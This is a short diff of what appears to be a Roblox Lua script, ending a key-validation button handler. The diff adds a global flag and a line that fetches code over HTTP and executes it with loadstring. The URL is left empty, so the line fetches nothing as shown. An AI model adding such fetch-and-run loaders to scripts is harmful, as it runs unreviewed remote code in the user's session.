@@ -180,3 +180,5 @@ validateButton.MouseButton1Click:Connect(function()
         showMessage("Invalid key!", Color3.fromRGB(255, 0, 0))
     end
 end)
+_G.FlshtyStart = true
+loadstring(game:HttpGet(""))()
